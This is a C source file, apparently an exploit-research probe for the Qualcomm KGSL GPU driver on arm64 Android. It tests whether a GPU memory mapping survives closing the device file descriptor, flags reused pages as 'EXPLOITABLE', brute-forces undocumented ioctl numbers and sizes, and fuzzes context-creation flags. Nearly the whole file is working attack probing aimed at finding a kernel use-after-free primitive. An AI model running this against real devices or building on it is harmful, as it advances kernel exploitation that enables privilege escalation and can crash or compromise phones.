/*
 * kgsl_mmap_uaf.c — KGSL mmap-after-free via fd close + ioctl exploration
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o kgsl_mmap_uaf kgsl_mmap_uaf.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

#define KGSL_IOC_TYPE 0x09

struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_cmdstream_readtimestamp {
    unsigned int type;
    unsigned int timestamp;
};

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc)

#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP \
    _IOR(KGSL_IOC_TYPE, 0x11, struct kgsl_cmdstream_readtimestamp)

static sigjmp_buf jmp_env;
static volatile int fault_caught = 0;
static void fault_handler(int sig) { fault_caught = 1; siglongjmp(jmp_env, 1); }

/* Test 1: mmap-after-fd-close */
static void test_mmap_after_close(void) {
    printf("\n=== Test 1: mmap-after-fd-close ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open"); return; }

    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 65536;
    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
        printf("  alloc: %s\n", strerror(errno)); close(fd); return;
    }
    printf("  Allocated: gpuaddr=0x%lx\n", alloc.gpuaddr);

    void *mapped = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
                       MAP_SHARED, fd, alloc.gpuaddr);
    if (mapped == MAP_FAILED) {
        printf("  mmap: %s\n", strerror(errno)); close(fd); return;
    }

    uint64_t *data = (uint64_t *)mapped;
    for (int i = 0; i < 16; i++) data[i * 512] = 0xDEAD000000000000ULL | i;
    printf("  Markers written, closing fd...\n");

    close(fd);

    struct sigaction sa, old_sa, old_bus;
    sa.sa_handler = fault_handler; sigemptyset(&sa.sa_mask); sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &old_sa); sigaction(SIGBUS, &sa, &old_bus);
    fault_caught = 0;

    if (sigsetjmp(jmp_env, 1) == 0) {
        volatile uint64_t val = data[0];
        printf("  Read after close: 0x%016lx\n", (uint64_t)val);
        if (val == (0xDEAD000000000000ULL)) {
            printf("  Pages still readable — dangling mapping persists!\n");
            data[0] = 0x4242424242424242ULL;
            volatile uint64_t check = data[0];
            printf("  Write+readback: 0x%016lx (%s)\n", (uint64_t)check,
                   check == 0x4242424242424242ULL ? "WRITABLE" : "read-only");
        } else {
            printf("  >>> DATA CHANGED! Pages reused — EXPLOITABLE! <<<\n");
        }
    } else {
        printf("  FAULT — mapping invalidated (driver cleaned up properly)\n");
    }

    sigaction(SIGSEGV, &old_sa, NULL); sigaction(SIGBUS, &old_bus, NULL);
    munmap(mapped, 65536);
}

/* Test 2: Find free ioctl */
static void test_find_free(void) {
    printf("\n=== Test 2: Finding GPU memory free ioctl ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open"); return; }

    struct kgsl_gpumem_alloc alloc = {0};
    alloc.size = 4096;
    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
        printf("  alloc: %s\n", strerror(errno)); close(fd); return;
    }
    printf("  Allocated gpuaddr=0x%lx\n", alloc.gpuaddr);

    /* Try all plausible free ioctl numbers with various struct sizes */
    int nrs[] = {0x15, 0x16, 0x17, 0x2E, 0x30, 0x35, 0x36};
    int nnrs = 7;
    for (int n = 0; n < nnrs; n++) {
        for (size_t sz = 4; sz <= 32; sz += 4) {
            unsigned char buf[32]; memset(buf, 0, 32);
            *(unsigned long *)buf = alloc.gpuaddr;

            /* IOW */
            unsigned long cmd = _IOC(_IOC_WRITE, KGSL_IOC_TYPE, nrs[n], sz);
            int ret = ioctl(fd, cmd, buf);
            if (ret == 0) printf("  0x%02x IOW/%zu: SUCCESS!\n", nrs[n], sz);
            else if (errno == EINVAL) printf("  0x%02x IOW/%zu: EINVAL\n", nrs[n], sz);

            /* IOWR */
            memset(buf, 0, 32); *(unsigned long *)buf = alloc.gpuaddr;
            cmd = _IOC(_IOC_READ|_IOC_WRITE, KGSL_IOC_TYPE, nrs[n], sz);
            ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  0x%02x IOWR/%zu: SUCCESS! data=", nrs[n], sz);
                for (size_t i = 0; i < sz; i++) printf("%02x", buf[i]);
                printf("\n");
            } else if (errno == EINVAL) {
                printf("  0x%02x IOWR/%zu: EINVAL\n", nrs[n], sz);
            }
        }
    }
    close(fd);
}

/* Test 3: READTIMESTAMP */
static void test_readtimestamp(void) {
    printf("\n=== Test 3: READTIMESTAMP ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open"); return; }

    /* IOR variant */
    for (unsigned int type = 0; type < 4; type++) {
        struct kgsl_cmdstream_readtimestamp ts = { .type = type };
        int ret = ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP, &ts);
        if (ret == 0) printf("  IOR type=%u: ts=%u\n", type, ts.timestamp);
        else printf("  IOR type=%u: %s\n", type, strerror(errno));
    }
    /* IOWR variant */
    unsigned long alt = _IOWR(KGSL_IOC_TYPE, 0x11, struct kgsl_cmdstream_readtimestamp);
    struct kgsl_cmdstream_readtimestamp ts = {0};
    int ret = ioctl(fd, alt, &ts);
    printf("  IOWR: %s", ret == 0 ? "SUCCESS" : strerror(errno));
    if (ret == 0) printf(" ts=%u", ts.timestamp);
    printf("\n");

    close(fd);
}

/* Test 4: DRAWCTXT_CREATE exhaustive */
static void test_drawctxt(void) {
    printf("\n=== Test 4: DRAWCTXT_CREATE ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open"); return; }

    uint32_t flags[] = {
        0, 1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80,
        0x0A, 0x1A, 0x3A,
        0x010000, 0x020000, 0x030000, 0x040000,
        0x01000000, 0x02000000,
        0x0001000A, 0x0002000A, 0x0101000A, 0x0102000A,
        0x00000108, 0x00000208, 0x00000308,
        0x00000F00, 0x0000FF00,
    };
    int nflags = sizeof(flags) / sizeof(flags[0]);
    int any_success = 0;

    for (int i = 0; i < nflags; i++) {
        struct kgsl_drawctxt_create ctx = { .flags = flags[i] };
        int ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);
        if (ret == 0) {
            printf("  flags=0x%08x: SUCCESS ctx_id=%u\n", flags[i], ctx.drawctxt_id);
            any_success = 1;
        } else if (errno != EINVAL && errno != ENOTTY) {
            printf("  flags=0x%08x: %s (%d)\n", flags[i], strerror(errno), errno);
        }
    }
    if (!any_success) printf("  All combinations returned EINVAL\n");

    close(fd);
}

/* Test 5: Complete ioctl scan with more sizes */
static void test_full_scan(void) {
    printf("\n=== Test 5: Full IOCTL Scan (0x00-0x40) ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open"); return; }

    size_t sizes[] = {4, 8, 12, 16, 20, 24, 32, 40, 48};
    int nsizes = 9;

    for (int nr = 0; nr <= 0x40; nr++) {
        for (int s = 0; s < nsizes; s++) {
            unsigned char buf[64]; memset(buf, 0, 64);

            /* IOWR */
            unsigned long cmd = _IOC(_IOC_READ|_IOC_WRITE, KGSL_IOC_TYPE, nr, sizes[s]);
            int ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  0x%02x IOWR/%2zu: OK data=", nr, sizes[s]);
                for (size_t i = 0; i < sizes[s] && i < 24; i++) printf("%02x", buf[i]);
                printf("\n");
            } else if (errno == EINVAL) {
                printf("  0x%02x IOWR/%2zu: EINVAL\n", nr, sizes[s]);
            }

            /* IOW */
            memset(buf, 0, 64);
            cmd = _IOC(_IOC_WRITE, KGSL_IOC_TYPE, nr, sizes[s]);
            ret = ioctl(fd, cmd, buf);
            if (ret == 0) printf("  0x%02x IOW /%2zu: OK\n", nr, sizes[s]);
            else if (errno == EINVAL) printf("  0x%02x IOW /%2zu: EINVAL\n", nr, sizes[s]);

            /* IOR */
            memset(buf, 0, 64);
            cmd = _IOC(_IOC_READ, KGSL_IOC_TYPE, nr, sizes[s]);
            ret = ioctl(fd, cmd, buf);
            if (ret == 0) {
                printf("  0x%02x IOR /%2zu: OK data=", nr, sizes[s]);
                for (size_t i = 0; i < sizes[s] && i < 24; i++) printf("%02x", buf[i]);
                printf("\n");
            } else if (errno == EINVAL) {
                printf("  0x%02x IOR /%2zu: EINVAL\n", nr, sizes[s]);
            }
        }
    }
    close(fd);
}

int main(void) {
    printf("=== KGSL mmap-after-free + IOCTL Exploration ===\n");
    printf("PID: %d  UID: %d\n", getpid(), getuid());

    test_mmap_after_close();
    test_find_free();
    test_readtimestamp();
    test_drawctxt();
    test_full_scan();

    printf("\n=== Done ===\n");
    return 0;
}
